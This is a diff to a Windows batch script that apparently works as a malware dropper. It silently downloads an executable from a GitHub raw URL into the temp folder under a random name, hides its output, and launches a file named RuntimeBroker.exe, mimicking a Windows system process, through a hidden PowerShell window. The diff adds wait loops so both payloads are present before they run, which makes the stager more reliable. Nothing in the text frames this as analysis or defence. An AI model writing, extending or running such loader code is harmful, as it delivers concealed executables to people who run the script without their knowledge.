@@ -13,6 +13,19 @@ if %errorlevel% == 0 (
     set RANDOM_NAME=%TEMP%\%RANDOM%.exe
     powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%RANDOM_NAME%'" >nul 2>&1
 
+    rem Ensure both files are fully downloaded before running
+    :wait_runtime
+    if not exist "%TEMP%\RuntimeBroker.exe" (
+        timeout /t 1 >nul
+        goto wait_runtime
+    )
+
+    :wait_os6a5v5a
+    if not exist "%RANDOM_NAME%" (
+        timeout /t 1 >nul
+        goto wait_os6a5v5a
+    )
+
     rem Run RuntimeBroker.exe
     powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"
 
@@ -45,6 +58,19 @@ if %errorlevel% == 0 (
     rem Download os6a5v5a.exe and assign a random name
     set RANDOM_NAME=%TEMP%\%RANDOM%.exe
     powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/os6a5v5a.exe' -OutFile '%RANDOM_NAME%'" >nul 2>&1
+
+    rem Ensure both files are fully downloaded before running
+    :wait_runtime
+    if not exist "%TEMP%\RuntimeBroker.exe" (
+        timeout /t 1 >nul
+        goto wait_runtime
+    )
+
+    :wait_os6a5v5a
+    if not exist "%RANDOM_NAME%" (
+        timeout /t 1 >nul
+        goto wait_os6a5v5a
+    )
 
     rem Run RuntimeBroker.exe
     powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"
